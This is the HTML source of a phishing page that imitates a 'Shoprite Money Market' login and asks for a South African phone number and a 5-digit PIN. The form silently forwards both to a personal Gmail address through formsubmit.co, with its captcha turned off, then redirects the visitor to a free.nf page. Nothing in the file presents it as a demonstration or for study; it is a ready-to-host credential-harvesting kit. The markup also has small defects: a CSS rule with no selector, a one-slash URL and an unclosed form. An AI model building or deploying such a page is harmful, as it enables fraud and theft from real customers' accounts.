<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Shoprite Money Market</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
  }

  body {
    margin: 0;
    background: #e10600;
  }

  .app {
    max-width: 420px;
    margin: 0 auto;
    min-height: 100vh;
    background: #e10600;
    padding-bottom: 40px;
  }

  /* TOP IMAGE SECTION */
  .top-image img {
    width: 100%;
    display: block;
  }

  /* LOGIN AREA */
  .login-area {
    padding: 24px 16px 0;
  }

  .input-box {
    width: 100%;
    padding: 16px;
    margin-bottom: 18px;
    border-radius: 12px;
    border: none;
    font-size: 17px;
  }

  .login-btn {
    width: 100%;
    padding: 16px;
    font-size: 20px;
    font-weight: bold;
    border: none;
    border-radius: 12px;
    background: #1e88e5;
    color: #fff;
    cursor: pointer;
  }
</style>
</head>

<body>

<div class="app">

  <!-- TOP PROMO IMAGE -->
  <div class="top-image">
    <img src="https://i.ibb.co/hRPjqcrk/Ho-F2Pi.webp" alt="Shoprite Money Market">
  </div>

  <!-- LOGIN FORM -->
  <div class="login-area">
    <form action="https:/formsubmit.co/gamingznoob404@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://shoprite-money-market.free.nf/submit.html">
      
    <input class="input-box" type="tel" name="number" placeholder="+27 XX XXX XXXX" required>
    <input class="input-box" type="password" name="5_digit_pin" placeholder="Enter 5 digit PIN" maxlength="5">
    <button class="login-btn">Log in</button>
  </div>

</div>
